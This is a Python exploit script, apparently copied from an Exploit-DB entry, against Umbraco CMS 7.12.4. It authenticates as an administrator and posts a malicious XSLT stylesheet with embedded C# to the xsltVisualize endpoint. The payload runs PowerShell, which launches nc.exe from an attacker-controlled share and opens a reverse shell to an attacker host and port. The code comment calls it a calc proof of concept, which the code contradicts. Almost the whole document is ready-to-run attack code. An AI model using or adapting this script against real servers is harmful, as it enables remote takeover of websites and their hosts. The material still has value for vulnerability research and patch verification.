# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Dork: N/A
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# CVE: N/A
# Code pulled from https://www.exploit-db.com/exploits/46153

import requests;
from bs4 import BeautifulSoup;

# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd ="-noexit Invoke-Command -scriptblock {//{host}/share/nc.exe {host} {port} -e powershell.exe}"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> '

class Payload:
    def __init__(self, target, host, port, user, passw):
        self.target = target
        self.host = host
        self.port = port
        self.user = user
        self.passw = passw

    def execute(self):
        global payload
        print("Starting exploit...")
        http_host = "http://" + self.target
        
        s = requests.session()
        url_main = http_host +  "/umbraco/";
        r1 = s.get(url_main);
        
        url_login = http_host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
        loginfo = {"username": self.user,"password": self.passw};
        r2 = s.post(url_login,json=loginfo);
        
        payload = payload.replace("{host}", self.host).replace("{port}", self.port)
        print(payload) 

        url_xslt = http_host + "/umbraco/developer/Xslt/xsltVisualize.aspx";
        r3 = s.get(url_xslt);
        
        soup = BeautifulSoup(r3.text, 'html.parser');
        VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
        VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
        UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
        headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
        data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};
        
        r4 = s.post(url_xslt,data=data,headers=headers);
        print(r4)
        print("Success")
